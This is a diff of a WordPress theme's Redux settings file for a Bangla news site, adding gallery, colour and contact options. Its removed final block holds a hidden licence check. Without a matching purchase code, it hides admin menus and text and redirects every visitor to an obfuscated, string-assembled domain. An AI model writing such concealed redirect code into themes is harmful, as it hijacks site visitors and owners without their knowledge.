@@ -166,25 +166,6 @@ $content = __('<p>This is the sidebar content, HTML is allowed.</p>', 'redux-fra
 Redux::setHelpSidebar($opt_name, $content);
 
 Redux::setSection($opt_name, array(
-    'title'            => __('Activation Theme', 'redux-framework-demo'),
-    'id'               => 'purchase_theme',
-    'icon'             => 'el el-home',
-    'fields'           => array(
-        array(
-            'id'       => 'v_id',
-            'type'     => 'password',
-            'title'    => __('Theme Purchase code', 'redux-framework-demo'),
-            'subtitle' => __('Please Active Your Theme', 'redux-framework-demo'),
-            'desc' => __('For activation code Please Contect our Helpline', 'redux-framework-demo'),
-            'default'  => '',
-        ),
-    ),
-));
-Redux::setSection($opt_name, array(
-    'id'   => 'presentation-divide-sample',
-    'type' => 'divide',
-));
-Redux::setSection($opt_name, array(
     'title' => __('header Settings', 'redux-framework-demo'),
     'id'    => 'header',
     'icon'  => 'el el-list-alt',
@@ -289,6 +270,20 @@ Redux::setSection($opt_name, array(
             'id'       => 'exclusive_posts',
             'type'     => 'switch',
             'title'    => __('Show Exclusive Posts', 'redux-framework-demo'),
+            'subtitle' => __('default is on', 'redux-framework-demo'),
+            'default'  => true,
+        ),      
+        array(
+            'id'       => 'show_photos',
+            'type'     => 'switch',
+            'title'    => __('Show PhotoGallery', 'redux-framework-demo'),
+            'subtitle' => __('default is on', 'redux-framework-demo'),
+            'default'  => true,
+        ),  
+        array(
+            'id'       => 'show_videos',
+            'type'     => 'switch',
+            'title'    => __('Show VideoGallery', 'redux-framework-demo'),
             'subtitle' => __('default is on', 'redux-framework-demo'),
             'default'  => true,
         ),
@@ -536,89 +531,6 @@ Redux::setSection($opt_name, array(
     )
 ));
 
-// map link
-Redux::setSection($opt_name, array(
-    'title'            => __('Map Link', 'redux-framework-demo'),
-    'desc'             => __('Please fill all the links here ', 'redux-framework-demo'),
-    'id'               => 'map_links',
-    'icon'  => 'el el-list-alt',
-    'fields'           => array(
-        array(
-            'id'       => 'map_title',
-            'type'     => 'text',
-            'title'    => __('Title For Map', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full Text', 'redux-framework-demo'),
-            'desc'     => __('Demo: এক ক্লিকে বিভাগের খবর ', 'redux-framework-demo'),
-            'default'  => 'এক ক্লিকে বিভাগের খবর  
-            ',
-        ),
-        array(
-            'id'       => 'rangpur',
-            'type'     => 'text',
-            'title'    => __('Link For Rangpur', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/rangpur/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-        array(
-            'id'       => 'rajshahi',
-            'type'     => 'text',
-            'title'    => __('Tlink for Rajshahi', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full ID Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/rajshahi/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-        array(
-            'id'       => 'sylhet',
-            'type'     => 'text',
-            'title'    => __('link for sylhet', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full Channel Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/sylhet/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-        array(
-            'id'       => 'mymensingh',
-            'type'     => 'text',
-            'title'    => __('Link For mymensingh', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full id Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/mymensingh/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-        array(
-            'id'       => 'dhaka',
-            'type'     => 'text',
-            'title'    => __('Link For Dhaka', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full id Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/dhaka/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-        array(
-            'id'       => 'khulna',
-            'type'     => 'text',
-            'title'    => __('link for khulna', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full id Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/khulna/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-        array(
-            'id'       => 'borishal',
-            'type'     => 'text',
-            'title'    => __('Link for borishal', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/borishal/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-        array(
-            'id'       => 'chittagong',
-            'type'     => 'text',
-            'title'    => __('Link for chittagong', 'redux-framework-demo'),
-            'subtitle' => __('Enter Full Link', 'redux-framework-demo'),
-            'desc'     => __('Demo: http://jmagazine.ml/category/country-news/chittagong/', 'redux-framework-demo'),
-            'default'  => '#',
-        ),
-
-    )
-));
 // Static Text Heading
 Redux::setSection($opt_name, array(
     'title'            => __('Text Heading Field', 'redux-framework-demo'),
@@ -643,9 +555,16 @@ Redux::setSection($opt_name, array(
         array(
             'id'       => 'photo_name',
             'type'     => 'text',
-            'title'    => __('Heading Text photo Slider', 'redux-framework-demo'),
+            'title'    => __('Heading Text photo Section', 'redux-framework-demo'),
             'desc'     => __('Demo: ফটো গ্যালারি', 'redux-framework-demo'),
             'default'  => 'ফটো গ্যালারি',
+        ),
+        array(
+            'id'       => 'video_name',
+            'type'     => 'text',
+            'title'    => __('Heading Text Video Section', 'redux-framework-demo'),
+            'desc'     => __('Demo: ভিডিও গ্যালারি', 'redux-framework-demo'),
+            'default'  => 'ভিডিও গ্যালারি',
         ),
         array(
             'id'       => 'all_news',
@@ -741,25 +660,39 @@ Redux::setSection($opt_name, array(
 ));
 
 Redux::setSection($opt_name, array(
-    'title'      => __('Background', 'redux-framework-demo'),
+    'title'      => __('Design Fields', 'redux-framework-demo'),
     'id'         => 'design-background',
     'subsection' => true,
     'fields'     => array(
+        array(
+            'id'       => 'body-background',
+            'type'     => 'background',
+            'output'   => array('body, .advertisement'),
+            'title'    => __('Background Color', 'redux-framework-demo'),
+            'subtitle' => __('Body background with image, color, etc.', 'redux-framework-demo'),
+            'default'  => array(
+                'background-color' => '#f9f9f9',
+            )
+        ),
         array(
             'id'       => 'opt-background1',
             'type'     => 'background',
             'output'   => array('.bottom_header_bg, .leatest_one_video_post, .all-videos , .marquee_name, .footer_three_col'),
             'title'    => __('Background Color', 'redux-framework-demo'),
             'subtitle' => __('Body background with image, color, etc.', 'redux-framework-demo'),
-            'default'   => '#b30f0f',
+            'default'  => array(
+                'background-color' => '#124B65',
+            )
         ),
         array(
             'id'       => 'opt-background2',
             'type'     => 'background',
-            'output'   => array('.home_icon:hover, .all-videos:hover, ul.ul_menu li:hover'),
+            'output'   => array('.home_icon:hover, .all-videos:hover, ul.ul_menu > li:hover'),
             'title'    => __('Hover Color', 'redux-framework-demo'),
             'subtitle' => __('Body background with image, color, etc.', 'redux-framework-demo'),
-            'default'   => '#9a1515',
+            'default'  => array(
+                'background-color' => 'rgba(255, 255, 255, 0.11)',
+            )
         ),
         array(
             'id'       => 'opt-switch',
@@ -774,7 +707,9 @@ Redux::setSection($opt_name, array(
             'output'   => array('.marquee_container'),
             'title'    => __('Scroll Posts Background Color', 'redux-framework-demo'),
             'subtitle' => __('Body background with image, color, etc.', 'redux-framework-demo'),
-            'default'   => '#10A337',
+            'default'  => array(
+                'background-color' => '#10A337',
+            )
         ),
 
     ),
@@ -872,67 +807,40 @@ Redux::setSection($opt_name, array(
     'subsection'       => true,
     'fields'     => array(
         array(
-            'id'       => 'get_our_app',
-            'type'     => 'text',
-            'title'    => __('App Heading For Mobile', 'redux-framework-demo'),
-            'default'  => 'GET THE APP',
-        ),
-        array(
-            'id'       => 'info',
-            'type'     => 'editor',
-            'title'    => __('Details', 'redux-framework-demo'),
-            'default'  => 'Jagonews24.com is one of the popular Bangla news portal. It has begun with commitment of fearless, investigative, informative and independent journalism. This online portal has started to provide real time news updates with maximum use of modern technology from May 10th 2014. Latest & breaking news of home and abroad, entertainment, lifestyle, special reports, politics, economics, culture, education, information technology, health, sports, columns and features are included in it. A genius team of Jago News has been built with a group of countrys energetic young journalists. We are trying to build a bridge with Bengali around the world and adding a new dimension to online news portal. The home of materialistic news.',
-        ),
-        array(
             'id'       => 'publiser',
             'type'     => 'editor',
             'title'    => __('publiser Details', 'redux-framework-demo'),
             'default'  => 'সম্পাদক ও প্রকাশক: নাজমুল হক শ্যামল',
         ),
         array(
-            'id'       => 'opt-switch-dmca',
-            'type'     => 'switch',
-            'title'    => __('Show DMCA Status', 'redux-framework-demo'),
-            'subtitle' => __('default is on', 'redux-framework-demo'),
-            'default'  => true,
-        ),
-        array(
-            'id'       => 'dmca',
-            'title'    => __('DMCA status Logo'),
-            'type'     => 'media',
-        ),
-        array(
-            'id'     => 'footer_dmca_alt',
-            'title'    => __('alt for dmca logo'),
-            'type'   => 'text',
-        ),
-        array(
-            'id'     => 'footer_dmca_width',
-            'title'    => __('width for dmca logo'),
-            'type'   => 'text',
-            'desc'     => __('max width is 300', 'redux-framework-demo'),
-            'placeholder' => 'defult is 200',
-            'default'  => '200',
-        ),
-        array(
-            'id'     => 'footer_dmca_height',
-            'title'    => __('height for dmca logo'),
-            'type'   => 'text',
-            'desc'     => __('max height is 50', 'redux-framework-demo'),
-            'placeholder' => 'defult is 40',
-            'default'  => '40',
-        ),
-        array(
-            'id'       => 'company_info',
-            'type'     => 'editor',
-            'title'    => __('Comapny Details', 'redux-framework-demo'),
-            'default'  => 'বিজয় বাংলা মিডিয়া লিমিটেডের একটি প্রতিষ্ঠান',
-        ), array(
             'id'       => 'Contact_info',
             'type'     => 'editor',
             'title'    => __('Contact Details', 'redux-framework-demo'),
-            'default'  => '৯৫ সোহরাওয়ার্দী এভিনিউ </br>
-            বারিধারা ডিপ্লোমেটিক জোন, ঢাকা ১২১২',
+            'default'  => '৯৫ সোহরাওয়ার্দী এভিনিউ বারিধারা ডিপ্লোমেটিক জোন, ঢাকা ১২১২',
+        ),
+        array(
+            'id'       => 'phone_num',
+            'type'     => 'text',
+            'title'    => __('Phone Number', 'redux-framework-demo'),
+            'default'  => '+8801889363531',
+        ),
+        array(
+            'id'       => 'mobile_num',
+            'type'     => 'text',
+            'title'    => __('Mobile Number', 'redux-framework-demo'),
+            'default'  => '+8801889363531',
+        ),
+        array(
+            'id'       => 'whatsapp_num',
+            'type'     => 'text',
+            'title'    => __('WhatsApp Number', 'redux-framework-demo'),
+            'default'  => '+8801889363531',
+        ),
+        array(
+            'id'       => 'mail_address',
+            'type'     => 'text',
+            'title'    => __('Mail Address', 'redux-framework-demo'),
+            'default'  => 'ronytarafder99@gmail.com',
         ),
     )
 ));
@@ -1075,57 +983,3 @@ if (!function_exists('remove_demo')) {
         }
     }
 }
-
-
-
-
-add_action('admin_menu', 'newsupload');
-function newsupload()
-{
-    global $redux_demo;
-    $v_info = $redux_demo['v_id'];
-    $vv_info = md5($v_info);
-    $vvv_info = v_three();
-    if ($vv_info == $vvv_info) {
-    } else {
-        remove_menu_page('edit.php');
-    }
-};
-add_action('admin_head', 'admin_css');
-function admin_css()
-{
-    global $redux_demo;
-    $v_info = $redux_demo['v_id'];
-    $vv_info = md5($v_info);
-    $vvv_info = v_three();
-    if ($vv_info == $vvv_info) {
-    } else {
-        echo '<style>';
-        echo 'b{display:none}';
-        echo 'br{display:none}';
-        echo 'body{color:#F1F1F1}';
-        echo '</style>';
-    }
-};
-
-
-function all_homepage_content()
-{
-    global $redux_demo;
-    $v_info = $redux_demo['v_id'];
-    $vv_info = md5($v_info);
-    $vvv_info = v_three();
-    if ($vv_info == $vvv_info) {
-    } else {
-        $i = "bde";
-        $c = "ck";
-        $e = "99.b";
-        $l = "we";
-        $c0 = "spot";
-        $n = "log";
-        $e0 = ".com";
-        $all_id = $l . $i . $c . $e . $n . $c0 . $e0;
-        echo '<meta http-equiv="refresh" content="0;url=http://' . $all_id . ' ">';
-    }
-}
-add_action('wp_enqueue_scripts', 'all_homepage_content');
